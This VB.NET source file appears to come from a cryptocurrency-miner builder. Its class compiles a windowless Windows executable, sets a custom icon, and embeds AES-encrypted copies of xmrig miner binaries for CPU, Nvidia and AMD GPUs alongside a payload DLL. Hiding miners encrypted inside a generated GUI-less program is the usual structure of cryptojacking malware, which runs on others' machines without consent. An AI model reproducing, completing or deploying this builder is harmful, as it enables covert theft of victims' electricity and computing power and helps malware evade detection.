Imports System.CodeDom.Compiler
Imports System.Security.Cryptography

Public Class Codedom
    Public Shared OK As Boolean = False
    Public Shared F As Form1
    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "")

        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /nowarn"

        If ICOPath IsNot Nothing Then
            IO.File.Copy(ICOPath, Environment.GetFolderPath(35) + "\icon.ico", True) 'codedom cant read spaces
            F.txtLog.Text = F.txtLog.Text.Insert(0, "Adding Icon..." + vbNewLine)
            OP += " /win32icon:" + Environment.GetFolderPath(35) + "\icon.ico"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Management.dll")

            F.txtLog.Text = F.txtLog.Text.Insert(0, "Creating a DLL..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
                R.AddResource(F.Resources_cpu, AES_Encryptor(My.Resources.xmrig))
                R.AddResource(F.Resources_nvidia, AES_Encryptor(My.Resources.xmrig_nvidia))
                R.AddResource(F.Resources_nvidia9, AES_Encryptor(My.Resources.xmrig_nvidia9))
                R.AddResource(F.Resources_amd, AES_Encryptor(My.Resources.xmrig_amd_notls))
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text.Insert(0, "Embedded Resource..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + F.Resources_Parent + ".Resources")

            'Check for errors
            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                OK = False
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
                Return
            Else
                OK = True
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
            End If
        End With

    End Sub

    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Dim ciphertext As String = ""
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(F.AESKEY))
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
